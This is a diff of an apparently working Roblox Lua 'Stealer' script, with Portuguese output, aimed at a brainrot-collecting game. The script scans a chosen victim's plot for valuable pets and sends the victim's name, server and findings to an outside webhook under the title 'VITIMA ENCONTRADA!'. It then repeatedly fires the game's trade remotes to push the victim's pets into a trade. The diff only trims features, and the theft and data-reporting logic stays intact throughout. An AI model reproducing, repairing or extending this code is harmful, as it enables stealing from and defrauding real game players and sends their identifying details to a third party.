@@ -23,14 +23,7 @@ local WANTED_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
 local WANTED_BASES = getgenv().NORMAL_BASE_SKINS or {}
 local WANTED_GEARS = getgenv().NORMAL_GEARS or {}
 
-local AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
-local MutationsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Mutations"))
-local TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
-local NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
-
-local function getRemote(id)
-    local remote = ReplicatedStorage:FindFirstChild(id, true)
-    if remote then return remote end
+local function findRemote(id)
     for _, child in ipairs(ReplicatedStorage:GetDescendants()) do
         if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
             if child.Name == id then
@@ -42,16 +35,16 @@ local function getRemote(id)
 end
 
 local REMOTES = {
-    Invite = getRemote("afb005f9-6e81-4e0a-8bb0-3555938a9658"),
-    AcceptInvite = getRemote("57624f2b-8aa9-4974-bb7a-08f058af33ef"),
-    AddBrainrot = getRemote("6b5f15fb-5cb9-4d07-a031-bbff8e641eda"),
-    RemoveBrainrot = getRemote("1a5f9c76-711f-4c90-8117-2ffd3fa21c6d"),
-    AddItem = getRemote("f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"),
-    RemoveItem = getRemote("a7e1b5c9-2d48-4f63-8a90-5c1d2e3f4a6b"),
-    Ready = getRemote("d73acf93-6f32-44df-b813-0f6b32c7afd9"),
-    Accept = getRemote("918ee0f5-e98f-413f-b76e-baee47b021cb"),
-    Cancel = getRemote("9d1937e7-6262-487b-98be-af45618270c9"),
-    Decline = getRemote("99448380-7cdd-45ad-be4e-332ec6194ba6"),
+    Invite = findRemote("afb005f9-6e81-4e0a-8bb0-3555938a9658"),
+    AcceptInvite = findRemote("57624f2b-8aa9-4974-bb7a-08f058af33ef"),
+    AddBrainrot = findRemote("6b5f15fb-5cb9-4d07-a031-bbff8e641eda"),
+    RemoveBrainrot = findRemote("1a5f9c76-711f-4c90-8117-2ffd3fa21c6d"),
+    AddItem = findRemote("f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"),
+    RemoveItem = findRemote("a7e1b5c9-2d48-4f63-8a90-5c1d2e3f4a6b"),
+    Ready = findRemote("d73acf93-6f32-44df-b813-0f6b32c7afd9"),
+    Accept = findRemote("918ee0f5-e98f-413f-b76e-baee47b021cb"),
+    Cancel = findRemote("9d1937e7-6262-487b-98be-af45618270c9"),
+    Decline = findRemote("99448380-7cdd-45ad-be4e-332ec6194ba6"),
 }
 
 for name, remote in pairs(REMOTES) do
@@ -75,14 +68,6 @@ local function scanVictim()
     if not plots then return {} end
 
     local victimPets = {}
-    local displayNameToIndex = {}
-
-    for idx, info in pairs(AnimalsData) do
-        if info.DisplayName then
-            displayNameToIndex[info.DisplayName] = idx
-        end
-        displayNameToIndex[idx] = idx
-    end
 
     for _, plot in ipairs(plots:GetChildren()) do
         local sign = plot:FindFirstChild("PlotSign")
@@ -98,20 +83,14 @@ local function scanVictim()
                             for _, desc in ipairs(plot:GetDescendants()) do
                                 if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
                                     local displayName = desc.Name
-                                    local index = displayNameToIndex[displayName] or displayName
                                     local attrs = desc:GetAttributes()
                                     local mutation = attrs.Mutation or attrs.__mutation or "None"
                                     local traits = attrs.Traits and tostring(attrs.Traits) or "None"
 
-                                    local info = AnimalsData[index]
-                                    local gen = info and info.Generation or 0
-
                                     table.insert(victimPets, {
                                         name = displayName,
-                                        index = index,
                                         mutation = mutation,
                                         traits = traits,
-                                        generation = gen,
                                     })
                                 end
                             end
@@ -138,10 +117,6 @@ local function checkItems(victimPets)
         end
     end
 
-    table.sort(found.brainrots, function(a, b)
-        return a.generation > b.generation
-    end)
-
     return found
 end
 
@@ -154,36 +129,21 @@ local function sendWebhook(victimPets, found, tradeStatus)
 
     local brainrotNames = {}
     for _, pet in ipairs(found.brainrots) do
-        table.insert(brainrotNames, pet.name .. " (Gen: " .. pet.generation .. ")")
-    end
-
-    local baseNames = {}
-    for _, base in ipairs(found.bases) do
-        table.insert(baseNames, base)
-    end
-
-    local gearNames = {}
-    for _, gear in ipairs(found.gears) do
-        table.insert(gearNames, gear)
+        table.insert(brainrotNames, pet.name)
     end
 
     local embed = {
         ["title"] = "VITIMA ENCONTRADA!",
         ["description"] = string.format(
-            "**%s** [%s]\n\n" ..
+            "**%s** [Brainrot]\n\n" ..
             "**Brainrots Encontrados:**\n%s\n\n" ..
-            "**Bases Encontradas:**\n%s\n\n" ..
-            "**Gears Encontrados:**\n%s\n\n" ..
             "**Server:** %s\n" ..
             "**Players:** %d\n" ..
             "**Scanned:** %s\n\n" ..
             "**Executor:** %s\n\n" ..
             "**Vítima:** %s • %d | %s",
             tradeStatus or "Status Desconhecido",
-            "Brainrot",
             #brainrotNames > 0 and table.concat(brainrotNames, "\n") or "Nenhum",
-            #baseNames > 0 and table.concat(baseNames, "\n") or "Nenhuma",
-            #gearNames > 0 and table.concat(gearNames, "\n") or "Nenhum",
             game.JobId or "Desconhecido",
             playerCount,
             timestamp,
@@ -227,25 +187,9 @@ local function addItemsToTrade(found)
 
     for _, pet in ipairs(found.brainrots) do
         pcall(function()
-            REMOTES.AddBrainrot:InvokeServer(pet.index, pet.mutation, pet.traits)
+            REMOTES.AddBrainrot:InvokeServer(pet.name, pet.mutation, pet.traits)
         end)
         task.wait(5)
-    end
-
-    if REMOTES.AddItem then
-        for _, base in ipairs(found.bases) do
-            pcall(function()
-                REMOTES.AddItem:InvokeServer("BaseSkin", base)
-            end)
-            task.wait(5)
-        end
-
-        for _, gear in ipairs(found.gears) do
-            pcall(function()
-                REMOTES.AddItem:InvokeServer("Gear", gear)
-            end)
-            task.wait(5)
-        end
     end
 end
 
@@ -297,13 +241,7 @@ while not tradeAccepted do
 
     print("[Stealer] Itens encontrados!")
     for _, pet in ipairs(found.brainrots) do
-        print("  - Brainrot: " .. pet.name .. " (Gen: " .. pet.generation .. ")")
-    end
-    for _, base in ipairs(found.bases) do
-        print("  - Base: " .. base)
-    end
-    for _, gear in ipairs(found.gears) do
-        print("  - Gear: " .. gear)
+        print("  - Brainrot: " .. pet.name)
     end
 
     if not isTrading then
